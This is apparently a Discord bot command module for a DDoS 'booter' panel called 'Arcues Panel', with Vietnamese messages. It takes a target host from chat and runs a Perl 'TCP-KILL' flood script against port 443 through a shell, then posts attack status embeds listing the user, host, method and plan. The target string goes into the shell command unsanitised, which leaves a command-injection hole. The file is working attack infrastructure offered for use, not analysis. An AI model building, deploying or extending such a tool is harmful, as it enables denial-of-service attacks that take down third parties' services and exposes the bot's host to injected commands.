const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('CẢNH BÁO')
	.setDescription("`Demo .TCP-KILL 1.2.3.4`")
	.setFooter("Vui lòng không tấn công các website có domain .gov")
	message.channel.send(embed1);
	return;
	}

var exec = require('child_process').exec
exec(`perl TCP-KILL.pl ${host} 443 65500 90`, (error, stdout, stderr) => {
});
setTimeout(function(){ 
    console.log('Cuộc tấn công đã dừng lại ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🚀 **Arcues Panel** 🚀')
	.setTimestamp()
	.setDescription("**► The attack is over 👾**")
	.setFooter('© Copyright: kiemhuy#0250', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
 }, 200000); //time in milliseconds
var gifler = ["https://i.gifer.com/DzUh.gif"];
    var randomgif = gifler[Math.floor((Math.random() * gifler.length))];
console.log('Start Attacking ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🚀 **Arcues Panel** 🚀')
	.setTimestamp()
  .setDescription("**👨‍💻User**:\n`[" + message.author.username + "]` \n **🔗Host**:\n`[" + host + "]` \n **💥Method**:\n`[TCP-KILL]` \n **🕒Time**:\n`[60]` \n **💸Plan**:\n`[Basic]`")	
  .setFooter('© Copyright: kiemhuy#0250', client.user.avatarURL)
	.setTimestamp()
	.setImage(randomgif)
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['TCP-KILL'],
  permLevel: 0
}

exports.help = {
  name: 'TCP-KILL',
  description: 'Hoan',
  usage: 'TCP-KILL'
}